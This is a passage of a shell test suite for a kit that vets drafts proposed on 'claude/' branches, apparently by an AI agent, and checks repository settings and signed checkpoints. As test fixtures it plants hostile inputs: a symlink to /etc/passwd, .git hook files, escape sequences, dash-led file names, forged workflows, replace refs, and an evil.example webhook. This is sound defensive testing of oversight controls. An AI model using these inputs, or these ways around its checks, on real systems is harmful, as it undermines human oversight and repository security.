server 'mkdir -p proposed; echo x >proposed/Makefile'; reset; out="$(printf 'n\ny\n' | "$K/adopt.sh" 2>&1)"; chk "a dropped proposal is not installed" "$(og ls-tree --name-only refs/heads/main -- Makefile | wc -l | tr -d ' ')" 0
good="$(og rev-parse refs/heads/main)"
hostile() { # hostile <what> <commands>: adopt.sh must refuse before it asks or changes anything
  server "$2"; reset
  out="$(printf 'y\ny\ny\ny\n' | "$K/adopt.sh" 2>&1)"; chk "refused: $1" $? 4
  chk "  before any question, and the clone is left clean" "$(has "$out" 'Adopt ') $(git status --porcelain | wc -l | tr -d ' ')" "0 0"
  case "$1" in "a link "*) ;; *) chk "  and it ends with the way to clear that draft away" "$(has "$out" "; refusing\. To clear it away: git rm 'proposed/[A-Za-z0-9._/+?-]*', then $K/land\.sh\. Put its unit back to \[ \] in the plan, so that the loop drafts it again\$")" 1 ;; esac # guard lets no link reach main
  restore
}
hostile "a .git target" 'mkdir -p proposed/aaa proposed/dot-git/hooks; echo ok >proposed/aaa/fine.txt; echo evil >proposed/dot-git/hooks/pre-commit'
hostile "a nested .GIT target" 'mkdir -p proposed/x/dot-GIT; echo evil >proposed/x/dot-GIT/config'
hostile "a link under proposed/" 'mkdir -p proposed; ln -s /etc/passwd proposed/link'
hostile "a target that is a directory" 'mkdir -p proposed; echo x >proposed/loop'
hostile "a target under a file" 'mkdir -p proposed/LICENSE; echo x >proposed/LICENSE/x'
hostile "a case variant of a locked file" 'mkdir -p proposed/loop; echo evil >proposed/loop/GUARD.sh'
hostile "a case variant of a directory" 'mkdir -p proposed/aaa; echo ok >proposed/aaa/first.txt; echo x >proposed/Loop'
hostile "a target under a case variant of a file" 'mkdir -p proposed/aaa proposed/license; echo ok >proposed/aaa/first.txt; echo x >proposed/license/terms.txt'
hostile "a target under a case variant of a directory, which a Mac would fold into the real one" 'mkdir -p proposed/dot-GitHub/Workflows; echo "on: schedule" >proposed/dot-GitHub/Workflows/weekly.yml'
hostile "two proposals for one target" 'mkdir -p proposed/dot-github "proposed/.github" 2>/dev/null; echo a >proposed/x.md.txt; echo b >proposed/x.md'
hostile "one proposal's file where another needs a directory" 'mkdir -p proposed/tools/foo.md proposed/dot-github/workflows; echo "name: aaa" >proposed/dot-github/workflows/aaa.yml; echo "# file" >proposed/tools/foo.md.txt; echo inner >proposed/tools/foo.md/bar'
hostile "the same, the other way round" 'mkdir -p proposed/.zoo; echo inner >proposed/.zoo/bar; echo file >proposed/dot-zoo'
hostile "a target that starts with a dash" 'mkdir -p proposed/x; echo x >proposed/x/dot--rf 2>/dev/null; echo x >"proposed/x/-rf"'
hostile "a carriage return, which Python and YAML read as a line break" 'mkdir -p proposed/aaa proposed/loop/test; echo ok >proposed/aaa/first.txt; printf "# Should these imports follow isort?\rimport os\n" >proposed/loop/test/extra.py'
chk "  the file is named" "$(has "$out" 'the proposal for loop/test/extra.py holds 1 control character(s)')" 1
hostile "an escape sequence" 'mkdir -p proposed; printf "ok\n\033[2Khidden\n" >proposed/Makefile'
hostile "a NUL byte" 'mkdir -p proposed; printf "ok\000\n" >proposed/Makefile'
hostile "a line separator, U+2028, which YAML reads as a line break" 'mkdir -p proposed/dot-github/workflows; printf "  # dropped in review\342\200\250  extra:\n" >proposed/dot-github/workflows/more.yml'
way() { printf '%s\n' "$out" | sed -n "s/.*To clear it away: \(git rm '[^']*'\), then .*/\1/p"; } # the command that the refusal names
server "mkdir -p proposed/tools; echo x >\"proposed/tools/it's odd.cmd\""; reset; out="$(printf 'y\ny\n' | "$K/adopt.sh" 2>&1)"
chk "a name that could end the quotation is not shown as it is, because you may paste that command. git still finds the file" "$(way); $(eval "$(way)")" "git rm 'proposed/tools/it?s?odd.cmd'; rm 'proposed/tools/it's odd.cmd'"; restore
server 'mkdir -p proposed/tools; echo all: >proposed/Makefile; printf "echo hi\r\n" >proposed/tools/win.cmd'; reset; out="$(printf 'y\ny\n' | "$K/adopt.sh" 2>&1)"; eval "$(way)" >/dev/null; L y "drop a draft"
out="$(printf 'y\ny\n' | "$K/adopt.sh" 2>&1)"; chk "followed to the letter, it clears the way for the other drafts" "$(has "$out" LANDED) $(og show refs/heads/main:Makefile)" "1 all:"; restore; rm -f "$W/loopkit/Makefile"
server 'mkdir -p proposed; ln -s /etc/passwd proposed/link'; reset; out="$(printf 'y\ny\ny\n' | PATH="$W/no-grep:$PATH" "$K/adopt.sh" 2>&1)"; chk "a link under proposed/, looked for with a broken grep: an error, not a no" $? 4; restore
server 'mkdir -p proposed; printf "a\ttab and caf\303\251\n" >proposed/Makefile'; reset; out="$(printf 'n\nn\n' | "$K/adopt.sh" 2>&1)"
chk "bytes that print as ? are counted in the heading" "$(has "$out" '^=== 1. Makefile   (new file; HOLDS 2 BYTES ABOVE 0x7e, WHICH PRINT AS ?)$')" 1; chk "and shown as ?" "$(has "$out" "$(printf '^+a\ttab and caf??$')")" 1; restore
server 'mkdir -p proposed/loop; cp loop/guard.sh proposed/loop/guard.sh; echo "# a remark" >>proposed/loop/guard.sh; chmod -x proposed/loop/guard.sh'; reset; out="$(printf 'n\nn\n' | "$K/adopt.sh" 2>&1)"
chk "a draft that would take the executable bit from a script is announced too" "$(has "$out" '^=== 1. loop/guard.sh   (replaces the current file; NO LONGER EXECUTABLE)$')" 1; restore
server 'mkdir -p proposed; echo x >proposed/Makefile'; reset; mkdir -p "$FAKE/pr/900"; echo OPEN >"$FAKE/pr/900/state"; echo "claude/U-004-x" >"$FAKE/pr/900/head"; out="$(printf 'y\ny\n' | "$K/adopt.sh" 2>&1)"
chk "an open pull request stops it before the first question, not after the last" "$? $(has "$out" 'Adopt ') $(has "$out" '#900 claude/U-004-x') $(git status --porcelain | wc -l | tr -d ' ')" "3 0 1 0"; rm -rf "$FAKE/pr/900"; restore
server 'mkdir -p proposed; echo x >proposed/Makefile; LC_ALL=C sed "s/^- \[ \] U-005 /- [S] U-005 /" loop/state/PLAN.md >p && mv p loop/state/PLAN.md; printf "a note \377\n" >>loop/state/PLAN.md'; reset
: >"$W/gpg.log"; git config gpg.program "$W/bin/gpg-spy"; out="$(printf 'y\ny\ny\n' | LC_ALL="$utf8" LANG="$utf8" "$K/adopt.sh" 2>&1)"; git config --unset gpg.program
chk "a byte in the plan that is not UTF-8 does not stop it half-way, whatever your locale" "$(has "$out" LANDED) $(og show refs/heads/main:loop/state/PLAN.md | grep -ac '^- \[x\] U-005 ')" "1 1"
chk "your locale reaches the signature through both scripts" "$(grep -c "^signs .* $utf8\$" "$W/gpg.log")" 1
restore; rm -f "$W/loopkit/Makefile"
out="$("$K/adopt.sh" 2>&1 </dev/null)"; chk "nothing proposed" "$(has "$out" 'nothing is proposed')" 1

# ---------------------------------------------------------------- settings
echo "## settings.sh"
T() { out="$("$K/settings.sh" "${1:-check}" 2>&1)"; rc=$?; }
T; chk "all settings read back as they should" "$rc" 0; chk "nineteen lines, one for each thing it reads" "$(has "$out" '^  ok    ')" 19
drift() { # drift <what> <file> <jq edit> [<start of the line that must say WRONG>]
  cp "$2" "$W/keep.json"; jq "$3" "$W/keep.json" >"$2"
  T; chk "noticed: $1" "$rc" 1
  [ -z "${4:-}" ] || chk "  by the line that reads it" "$(has "$out" "^  WRONG $4")" 1
  cp "$W/keep.json" "$2"
}
plant() { # plant <what> <file under $FAKE> <JSON> <start of the line that must say WRONG>: something that should not exist at all
  printf '%s\n' "$3" >"$FAKE/$2"
  T; chk "noticed: $1" "$rc $(has "$out" "^  WRONG $4")" "1 1"
  rm "$FAKE/$2"
}
rs() { grep -l "\"$1" "$FAKE"/rulesets/*.json | head -n 1; }
drift "the ruleset on main is switched off" "$(rs 'loop: main')" '.enforcement = "disabled"'
drift "someone may bypass it" "$(rs 'loop: main')" '.bypass_actors = [{"actor_id": 5, "actor_type": "RepositoryRole", "bypass_mode": "always"}]'
drift "guard is no longer required" "$(rs 'loop: main')" '(.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks) |= map(select(.context != "guard"))'
drift "the macOS gate is no longer required" "$(rs 'loop: main')" '(.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks) |= map(select(.context != "gate-macos"))'
drift "any app may report guard" "$(rs 'loop: main')" '(.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks[] | select(.context == "guard") | .integration_id) = null'
drift "branches need not be up to date" "$(rs 'loop: main')" '(.rules[] | select(.type == "required_status_checks") | .parameters.strict_required_status_checks_policy) = false'
drift "the ruleset on main is aimed at another branch" "$(rs 'loop: main')" '.conditions.ref_name.include = ["refs/heads/other"]' 'those rules are aimed at the default branch'
drift "it is aimed at nothing" "$(rs 'loop: main')" '.conditions.ref_name.include = []' 'those rules are aimed at the default branch'
drift "main is excluded from it" "$(rs 'loop: main')" '.conditions.ref_name.exclude = ["refs/heads/main"]' 'those rules are aimed at the default branch'
chk "  and GitHub's own list of the rules in force on main is empty then" "$(has "$out" '^  WRONG and GitHub counts exactly those rules')" 1
drift "it has become a ruleset for tags" "$(rs 'loop: main')" '.target = "tag"' 'those rules are aimed at the default branch'
plant "a rule on main that no file in the kit knows" rulesets/9.json '{"id": 9, "name": "x", "target": "branch", "enforcement": "active", "conditions": {"ref_name": {"include": ["~ALL"], "exclude": []}}, "rules": [{"type": "update"}]}' 'and GitHub counts exactly those rules'
drift "push events may start workflows" "$FAKE/policies/1.json" '.rules[0].parameters.allowed_events += ["push"]'
drift "the Actions policy is switched off" "$FAKE/policies/1.json" '.enforcement = "disabled"'
drift "the policy leaves one workflow file out" "$FAKE/policies/1.json" '.conditions.workflow_path.exclude = [".github/workflows/x.yml"]' 'that policy covers every workflow file'
drift "the policy covers one workflow file only" "$FAKE/policies/1.json" '.conditions.workflow_path.include = [".github/workflows/ci.yml"]' 'that policy covers every workflow file'
drift "tags may be created" "$(rs 'loop: no tags')" '.enforcement = "disabled"'
drift "tags may be moved" "$(rs 'loop: no tags')" '.rules = [{"type": "creation"}, {"type": "deletion"}]'
drift "some tags are left out" "$(rs 'loop: no tags')" '.conditions.ref_name.exclude = ["refs/tags/v*"]' 'those rules are aimed at every tag'
drift "checkpoint tags are left out, as they once were" "$(rs 'loop: no tags')" '.conditions.ref_name.exclude = ["refs/tags/loop-checkpoint-*"]' 'those rules are aimed at every tag'
og update-ref refs/tags/v9 refs/heads/main; T; chk "noticed: a tag that reached GitHub before the rules did" "$rc $(has "$out" '^  WRONG GitHub holds no tag at all')" "1 1"; og update-ref -d refs/tags/v9
drift "outsiders may open issues and comment" "$FAKE/limit.json" '{}'
drift "merge commits are allowed" "$FAKE/repo.json" '.allow_merge_commit = true'
drift "auto-merge is allowed" "$FAKE/repo.json" '.allow_auto_merge = true'
drift "anyone may open a pull request" "$FAKE/repo.json" '.pull_request_creation_policy = "all"' 'public, default branch main'
drift "a second collaborator" "$FAKE/collaborators.json" '. + [{"login": "someone", "role_name": "write"}]' 'nobody but you is a collaborator'
cp "$FAKE/collaborators.json" "$W/keep.json"; echo '[]' >"$FAKE/collaborators.json"; T; chk "if GitHub does not list the owner among the collaborators, that is fine too" "$rc" 0
echo '[{"login":"Omkhar","role_name":"admin"}]' >"$FAKE/collaborators.json"; T; chk "and so is another spelling of your name" "$rc" 0; cp "$W/keep.json" "$FAKE/collaborators.json"
plant "an Actions secret" secrets 1 'no Actions secrets'
plant "a release" releases.json '[{"id": 1}]' 'no releases'
plant "a draft of a release" releases.json '[{"id": 1, "draft": true}]' 'no releases'
plant "a deploy key" keys.json '[{"id": 1, "title": "x", "read_only": false}]' 'no deploy keys'
plant "an answer about releases that makes no sense" releases.json '{}' 'no releases'; plant "and one about deploy keys" keys.json '{}' 'no deploy keys'
drift "and one about collaborators" "$FAKE/collaborators.json" '{}' 'nobody but you is a collaborator'
echo '[{"id": 1, "name": "web", "active": true, "config": {"url": "https://hooks.example.com:8443/x?y=1"}}, {"id": 2, "config": {}},
  {"id": 3, "config": {"url": "https://claude.ai:x@evil.example/hook"}}, {"id": 4, "config": {"url": "HTTPS://Upper.example/x"}}]' >"$FAKE/hooks.json"
T; chk "a webhook is shown with its host, not with a name and password in front of it, and stops nothing" "$rc $(has "$out" '^  NOTE  webhooks: 4, sending to: (no address) Upper.example evil.example hooks.example.com$')" "0 1"
echo '{"message": "x"}' >"$FAKE/hooks.json"; T; chk "an answer about webhooks that makes no sense is a failure" "$rc $(has "$out" '^  WRONG the webhooks can be read')" "1 1"; rm "$FAKE/hooks.json"
plant "a third App with a check suite on the newest commit of main" check-suites.json '{"total_count": 3, "check_suites": [{"app": {"slug": "claude"}}, {"app": {"slug": "github-actions"}}, {"app": {"slug": "some-scanner"}}]}' 'no App but claude and GitHub Actions'
echo '{"total_count": 1, "check_suites": [{"app": {"slug": "claude"}}]}' >"$FAKE/check-suites.json"; T; chk "a fresh commit of main, where no workflow has run yet, is fine" "$rc" 0; rm "$FAKE/check-suites.json"
plant "no claude among the Apps, GitHub Actions alone" check-suites.json '{"total_count": 1, "check_suites": [{"app": {"slug": "github-actions"}}]}' 'no App but claude and GitHub Actions'
plant "no check suite at all" check-suites.json '{"total_count": 0, "check_suites": []}' 'no App but claude and GitHub Actions'
plant "an answer about check suites that makes no sense" check-suites.json '{}' 'no App but claude and GitHub Actions'
plant "an environment named release" environments.json '{"total_count": 1, "environments": [{"id": 1, "name": "release"}]}' 'no environments'
plant "an environment named bump: that one belongs in omkhar/workcell" environments.json '{"total_count": 1, "environments": [{"id": 1, "name": "bump"}]}' 'no environments'
plant "an answer about environments that makes no sense" environments.json '{}' 'no environments'
for read in rulesets rules/branches/main tags keys hooks collaborators environments commits/heads/main/check-suites; do
  FAKE_FAIL="api repos/*/$read*" "$K/settings.sh" check >/dev/null 2>&1; chk "a read that fails is a failure, not a pass: $read" $? 1
done
mv "$K/github-tags-all.json" "$W/keep.json"; T; chk "nor does a file that is missing from the kit make two empty answers equal" "$rc $(has "$out" '^  WRONG those rules are aimed at every tag')" "1 1"; mv "$W/keep.json" "$K/github-tags-all.json"
jq '.conditions.workflow_path = {"include": [".github/workflows/none.yml"], "exclude": []}' "$FAKE/policies/1.json" >"$W/keep.json"; cp "$W/keep.json" "$FAKE/policies/1.json"
jq 'del(.conditions)' "$K/github-actions-policy.json" >"$W/old-policy.json"; gh api -X PUT repos/o/r/actions/policies/1 --input "$W/old-policy.json"
T; chk "(as on GitHub, an update that names no workflow files leaves a narrowed policy narrowed)" "$(has "$out" '^  WRONG that policy covers every workflow file')" 1
T apply; chk "settings.sh apply names them, and so repairs it" "$rc" 0
rm "$FAKE"/policies/*.json; out="$(FAKE_NO_PATHS=1 "$K/settings.sh" apply 2>&1)"; rc=$?
chk "where GitHub offers no targeting by path, the policy goes in without it, and counts as covering everything" "$rc $(jq -r '.conditions.workflow_path // "none"' "$FAKE"/policies/*.json)" "0 none"
rm "$FAKE"/policies/*.json; T apply; chk "(back to a policy that names them)" "$rc $(jq -r '.conditions.workflow_path.include[0]' "$FAKE"/policies/*.json)" "0 ~ALL"
T apply; chk "applying twice makes no duplicates" "$(find "$FAKE/rulesets" "$FAKE/policies" -name '*.json' | wc -l | tr -d ' ')" 3

# ---------------------------------------------------------------- checkpoint
echo "## checkpoint.sh"
copy() { og rev-parse --quiet --verify "refs/checkpoints/loop-checkpoint-$1"; } # what GitHub holds as the copy of checkpoint N
mine() { git rev-parse "refs/tags/loop-checkpoint-$1"; }
ran() { echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) $*" >>"$FAKE/runs"; } # ran <event> <workflow file> <branch> <conclusion>
reset; C y; chk "a normal checkpoint is signed" "$(has "$out" 'signed loop-checkpoint-1$')" 1
chk "the tag stays in your clone, and GitHub gets a copy that is not a tag" "$(copy 1) $(og for-each-ref refs/tags | wc -l | tr -d ' ')" "$(mine 1) 0"
chk "your clone keeps a second copy of it from the start, under a name that git never prunes" "$(git rev-parse --quiet --verify refs/loop/checkpoints/loop-checkpoint-1)" "$(mine 1)"
chk "it lists the locked paths you signed" "$(has "$out" '^  loop/SPEC.md')" 1; chk "and the gates you ticked" "$(has "$out" '(human gate) - \[H\] H-011')" 1
chk "the link to read uses hashes, not names" "$(has "$out" "compare/[0-9a-f]\{40\}\.\.\.[0-9a-f]\{40\}")" 1; chk "it re-read the settings" "$(has "$out" 'no bypass for anyone')" 1
chk "left-over branches were swept up" "$(og for-each-ref 'refs/heads/claude/*' 'refs/heads/mac/*' | wc -l | tr -d ' ')" 0; chk "and each is named" "$(has "$out" '^  [mc][a-z]*/[A-Za-z0-9._-]*$')" "$(printf '%s\n' "$out" | sed -n 's/^deleted \([0-9]*\) left-over branches.*/\1/p')"
chk "the probes of setup-2, which the policy stopped, are listed as what they are" "$(has "$out" '^  push .github/workflows/selftest-forged.yml claude/selftest-evil-') $(has "$out" 'so are the probes of setup-2')" "$(grep -c ' push .github/workflows/selftest-forged.yml ' "$FAKE/runs") 1"
chk "the real checks are not" "$(has "$out" '^  pull_request_target ') $(grep -c ' pull_request_target ' "$FAKE/runs" | sed 's/^[1-9][0-9]*$/many/')" "0 many"
git push -q origin refs/tags/loop-checkpoint-1 2>/dev/null; chk "(the stand-in takes no tag of any name, as GitHub will not)" $? 1
C; chk "nothing new" "$(has "$out" 'nothing new')" 1
good="$(og rev-parse refs/heads/main)"
server 'echo "# decoy" >>loop/SPEC.md' "U-050: decoy (#0)"; server 'echo ok >>docs/ok.md' "U-051: fine (#0)"; server 'echo "# payload" >>loop/lib.sh' "U-052: payload (#0)"
C y; chk "locked changes you never signed stop it" "$(has "$out" 'you never signed that change')" 2; chk "the decoy is named" "$(has "$out" '    loop/SPEC.md')" 1; chk "and so is what came after it" "$(has "$out" '    loop/lib.sh')" 1
chk "nothing is signed" "$(git tag --list loop-checkpoint-2 | wc -l | tr -d ' ')" 0; "$K/preflight.sh" >/dev/null 2>&1; chk "preflight sees it too" $? 1; restore
# the recovery that REFERENCE.md section 8 describes, followed to the letter
server 'echo "# payload" >>loop/lib.sh; echo x >loop/extra.sh' "U-058: tampered (#0)"; C y; chk "(an incident: the checkpoint stops)" "$(has "$out" 'you never signed that change')" 1
git merge -q --ff-only refs/remotes/origin/main; cp "$K/lib.sh" loop/lib.sh; rm loop/extra.sh; L y --reviewed "put the locked files back"; chk "recovery: the repair lands with --reviewed" "$(has "$out" LANDED)" 1
"$K/preflight.sh" >/dev/null 2>&1; chk "recovery: preflight says main equals your kit again" $? 0
C y; chk "recovery: checkpoint.sh still refuses, because the bad commit is in the range" "$(has "$out" 'you never signed that change')" 1
git tag -s loop-checkpoint-2 refs/remotes/origin/main -m "reviewed by hand after an incident"
command git -c credential.helper= -c 'credential.helper=!gh auth git-credential' push --no-follow-tags -q origin refs/tags/loop-checkpoint-2:refs/checkpoints/loop-checkpoint-2 # typed by you, so under your own settings
chk "recovery: the copy of a hand-signed checkpoint goes to GitHub, and no tag goes with it" "$? $(copy 2)" "0 $(mine 2)"
echo after >>docs/notes.md; L y; C y; chk "recovery: after a hand-signed checkpoint, life goes on" "$(has "$out" 'signed loop-checkpoint-3$')" 1; good="$(og rev-parse refs/heads/main)"
server 'sed "s/^- \[H\] H-103 /- [x] H-103 /" loop/state/PLAN.md >p && mv p loop/state/PLAN.md' "U-053: sneaky tick (#0)"; C y; chk "a gate ticked without you stops it" "$(has "$out" 'did something only you may do')" 1; restore
server 'ln -s /etc/passwd docs/link' "U-054: a link (#0)"; C y; chk "a link that reached main stops it" "$(has "$out" 'you never signed that change')" 1; restore
server 'echo "# weak" >>loop/guard.sh' "U-055: tampered (#0)"; git fetch -q origin '+refs/heads/main:refs/remotes/origin/main'; bad_c="$(git rev-parse refs/remotes/origin/main)"
git update-ref "refs/replace/$bad_c" "$(git -c commit.gpgsign=false commit-tree "$good^{tree}" -p "$good" -m clean)"; C y; chk "a replace ref cannot hide it" "$(has "$out" 'you never signed that change')" 1; git update-ref -d "refs/replace/$bad_c"; restore
echo "# ok" >>loop/SPEC.md; L y --reviewed; for r in $(landed); do git update-ref -d "$r"; done
C y; chk "your signature is found through the pull request" "$(has "$out" 'signed loop-checkpoint-4$')" 1
# the allowlist in force at the time decides
echo '^tools/' >>loop/free-paths.txt; L y --reviewed "widen the allowlist"; server 'mkdir -p tools; echo x >tools/x.go' "U-056: uses the new path (#0)"; C y; chk "after you widen the list, work there is accepted" "$(has "$out" 'signed loop-checkpoint-5$')" 1
reset; edit '/^\^tools\//d' loop/free-paths.txt; rm -rf tools; L y --reviewed "narrow it again"; server 'mkdir -p tools; echo y >tools/x.go' "U-057: no longer allowed (#0)"; C y; chk "after you narrow it, work there stops the checkpoint" "$(has "$out" 'you never signed that change')" 1
og update-ref refs/heads/main "$(og rev-parse 'refs/heads/main^')"; reset; C y; good="$(og rev-parse refs/heads/main)"
# the copies on GitHub: nothing protects them, so nothing trusts them
og update-ref refs/checkpoints/loop-checkpoint-999 "$good"; og update-ref refs/checkpoints/loop-checkpoint-500 "$(mine 0)"; og update-ref refs/checkpoints/loop-checkpoint-9x "$good"; og update-ref refs/checkpoints/loop-checkpoint-7/x "$good"
git -c user.signingkey="$OTHER" tag -s loop-checkpoint-600 "$good" -m forged; git push -q origin refs/tags/loop-checkpoint-600:refs/checkpoints/loop-checkpoint-600; git tag -d loop-checkpoint-600 >/dev/null
echo t >>docs/notes.md; L y; C y; chk "planted, forged, renamed and oddly numbered copies are ignored, with a note" "$(has "$out" 'is not a checkpoint you signed')" 5; chk "a planted name that is in the way of the copy costs a NOTE, not a number" "$(has "$out" 'signed loop-checkpoint-7$') $(has "$out" '^NOTE: GitHub did not take the copy')" "1 1"
chk "none of them became a local tag" "$(git tag --list | grep -cE '999|600|500|9x|7/x')" 0; good="$(og rev-parse refs/heads/main)"
for x in 999 600 500 9x 7/x; do og update-ref -d "refs/checkpoints/loop-checkpoint-$x"; done
og update-ref refs/checkpoints/loop-checkpoint-8 "$good"; echo t >>docs/notes.md; L y; C y; good="$(og rev-parse refs/heads/main)"
chk "a copy that was planted under the next number does not change your number, and yours takes its place" "$(has "$out" 'signed loop-checkpoint-8$') $(copy 8) $(copy 7)" "1 $(mine 8) $(mine 7)"
og update-ref refs/checkpoints/loop-checkpoint-8 "$kit_c"; og update-ref refs/checkpoints/loop-checkpoint-5 "$good"; og update-ref -d refs/checkpoints/loop-checkpoint-3
C; chk "a moved copy of the newest checkpoint changes nothing: your clone is the anchor" "$(has "$out" 'nothing new since loop-checkpoint-8')" 1
chk "copies that were moved or deleted are put back" "$(copy 8) $(copy 5) $(copy 3)" "$(mine 8) $(mine 5) $(mine 3)"
blocked on; C; blocked off
chk "copies that cannot be fetched are said aloud, with where to find the way to clear them, and stop nothing" "$(has "$out" '^NOTE: not every copy under refs/checkpoints/ on GitHub could be fetched') $(has "$out" '^One command clears away every name there that you did not make: REFERENCE.md section 2. Never paste such a name into a command.$') $(has "$out" 'nothing new since loop-checkpoint-8')" "1 1 1"
rm -rf "$W/wc2"; git clone -q -b main "file://$W/origin.git" "$W/wc2"; (cd "$W/wc2" && git config user.signingkey "$ME" && printf 'y\n' | "$K/checkpoint.sh" 2>&1) >"$W/o2"; chk "a fresh clone finds your checkpoints on GitHub" "$(grep -c 'nothing new since loop-checkpoint-8' "$W/o2")" 1
og update-ref -d refs/checkpoints/loop-checkpoint-8; rm -rf "$W/wc2"; git clone -q -b main "file://$W/origin.git" "$W/wc2"; (cd "$W/wc2" && git config user.signingkey "$ME" && printf 'n\n' | "$K/checkpoint.sh" 2>&1) >"$W/o2"
chk "if the newest copy is gone, a fresh clone falls back to an older one, and checks more" "$(grep -c 'commits since loop-checkpoint-7' "$W/o2")" 1
for r in $(og for-each-ref --format='%(refname)' refs/checkpoints); do og update-ref -d "$r"; done
rm -rf "$W/wc2"; git clone -q -b main "file://$W/origin.git" "$W/wc2"; (cd "$W/wc2" && git config user.signingkey "$ME" && printf 'y\n' | "$K/checkpoint.sh" 2>&1) >"$W/o2"
chk "if every copy is gone, a fresh clone has no anchor: it signs nothing, and says what to do" "$(grep -c 'CHECKPOINT STOP: there is no checkpoint signed by the key in your kit' "$W/o2") $(git -C "$W/wc2" tag --list | wc -l | tr -d ' ')" "1 0"
chk "and what it means if you had checkpoints before" "$(grep -c '^If you had checkpoints before and have not changed your key, treat this as an incident\.$' "$W/o2")" 1
all_tags="$(git for-each-ref --format='%(objectname) %(refname)' refs/tags)"; command git -c fetch.prune=true -c fetch.pruneTags=true fetch -q origin
chk "(with fetch.prune and fetch.pruneTags among your settings, one plain git fetch deletes every tag in your clone, because GitHub holds none)" "$(git for-each-ref refs/tags | wc -l | tr -d ' ')" 0
C; chk "your clone keeps a second copy under a name that git never prunes: checkpoint.sh still finds its anchor, and puts the tag and its copy back" "$(has "$out" 'nothing new since loop-checkpoint-8') $(copy 8)" "1 $(mine 8)"
git fetch -q . 'refs/loop/checkpoints/*:refs/tags/*'; chk "every checkpoint is in that second copy, those you signed by hand too" "$(git for-each-ref --format='%(objectname) %(refname)' refs/tags)" "$all_tags"
echo r >>docs/notes.md; L y; out="$(echo y | FAKE_PUSH_SHUT='refs/checkpoints/*' "$K/checkpoint.sh" 2>&1)"; chk "if GitHub refuses the copies, the checkpoint is signed all the same" "$? $(has "$out" 'signed loop-checkpoint-9$')" "0 1"
chk "and it says so aloud" "$(has "$out" '^NOTE: GitHub did not take the copy') $(copy 9)" "2 "; C; chk "the next run sends them" "$(copy 9) $(copy 8)" "$(mine 9) $(mine 8)"; good="$(og rev-parse refs/heads/main)"
chk "all of them: your clone holds the originals" "$(og for-each-ref --format='%(objectname)' refs/checkpoints | LC_ALL=C sort | tr '\n' ' ')" "$(git for-each-ref --format='%(objectname)' 'refs/tags/loop-checkpoint-*' | LC_ALL=C sort | tr '\n' ' ')"
server 'echo z >>docs/z.md' "pushed directly with a throwaway key" nowebflow; C y; chk "a throwaway-key commit stops it" "$(has "$out" 'signed neither by you nor by GitHub')" 1; restore
(cd "$W/m" && git fetch -q origin && git reset -q --hard origin/main && s="$(git -c commit.gpgsign=false commit-tree 'HEAD^{tree}' -p 'HEAD~1' -m side)" && echo "$s" >>"$FAKE/webflow" && git -c commit.gpgsign=false merge -q -s ours --no-edit "$s" && git -c gpg.format=openpgp -c user.signingkey="$OTHER" commit -q --amend -S --no-edit && git rev-parse HEAD >>"$FAKE/webflow" && FAKE_SERVER=1 git push -q origin HEAD:main)
C y; chk "a merge commit stops it" "$(has "$out" 'is a merge commit')" 1; restore
server 'mkdir -p escape; echo "package e" >escape/i2_test.go; printf "I2\nI3\n" >escape/enforced.txt' "U-060: a test (#0)"; C y; good="$(og rev-parse refs/heads/main)"
server 'git rm -q escape/i2_test.go; echo I3 >escape/enforced.txt' "U-061: tidy (#0)"; C n; chk "a deleted test is listed" "$(has "$out" '  escape/i2_test.go')" 1; chk "a lost invariant is listed" "$(has "$out" 'ENFORCED INVARIANTS THAT DISAPPEARED')" 1; restore
# runs that an event other than the two allowed ones started
echo s >>docs/notes.md; L y; C n; chk "an honest period lists no workflow run" "$(has "$out" 'WORKFLOW RUNS THAT A FORBIDDEN EVENT STARTED')" 0
ran push .github/workflows/sneaky.yml claude/evil success; ran push .github/workflows/guard.yml claude/evil success; ran pull_request omkhar/workcell-v2/.github/workflows/ci.yml@claude/evil claude/evil success
ran workflow_dispatch .github/workflows/decoy.yml claude/evil failure; ran schedule .github/workflows/nightly.yml main success; ran pull_request_target .github/workflows/ci.yml claude/fine failure
C n; chk "a workflow that is not on main but ran is reported" "$(has "$out" '^  push .github/workflows/sneaky.yml claude/evil$')" 1
chk "so is a forgery under the path of a real workflow" "$(has "$out" '^  push .github/workflows/guard.yml claude/evil$')" 1
chk "the repository's name in front of a path is dropped" "$(has "$out" '^  pull_request .github/workflows/ci.yml@claude/evil claude/evil$')" 1
chk "a run that ended in failure counts too: one decoy job can arrange that" "$(has "$out" '^  workflow_dispatch .github/workflows/decoy.yml claude/evil$')" 1
chk "runs of the two allowed events are not listed" "$(has "$out" 'nightly.yml') $(has "$out" 'claude/fine')" "0 0"; : >"$FAKE/runs"; good="$(og rev-parse refs/heads/main)"
many() { seq 1 "$1" | sed "s#.*#$(date -u +%Y-%m-%dT%H:%M:%SZ) pull_request_target .github/workflows/ci.yml claude/fine success#" >"$FAKE/runs"; } # many <number>: so many honest runs in this period
many 1000; C n; chk "a thousand runs in the period: it warns that GitHub's list ends there" "$(has "$out" '^WARNING: 1000 runs since loop-checkpoint-[0-9]*\. GitHub lists 1,000 at most, so older ones are missing above\. Look at the Actions tab\.$')" 1
many 999; C n; chk "one run fewer: no warning" "$(has "$out" WARNING) $(has "$out" 'Sign loop-checkpoint-')" "0 1"; : >"$FAKE/runs"
out="$(echo n | FAKE_FAIL='api repos/*/actions/runs*' "$K/checkpoint.sh" 2>&1)"; chk "if the runs cannot be counted, it says that too" "$(has "$out" '^note: could not count the workflow runs') $(has "$out" 'could not list')" "1 0"
cp "$FAKE/policies/1.json" "$W/keep.json"; jq '.enforcement = "disabled"' "$W/keep.json" >"$FAKE/policies/1.json"; C y; chk "a setting that drifted stops it" "$(has "$out" 'a setting the lock depends on')" 1; cp "$W/keep.json" "$FAKE/policies/1.json"
# a branch called just mac or claude blocks every branch below that name
C y; og update-ref refs/heads/mac "$good"; og update-ref refs/heads/claude "$good"; echo b >>docs/notes.md; L y; chk "(a branch called mac stops every landing)" "$(has "$out" 'push failed')" 1; reset
server 'echo c >>docs/c.md' "U-062: fine (#0)"; C y; chk "the sweep takes a branch called just mac, or just claude" "$(has "$out" '^  mac$') $(has "$out" '^  claude$') $(og for-each-ref refs/heads/mac refs/heads/claude | wc -l | tr -d ' ')" "1 1 0"
good="$(og rev-parse refs/heads/main)" anchor="$good"
# history that was rewritten after the last checkpoint
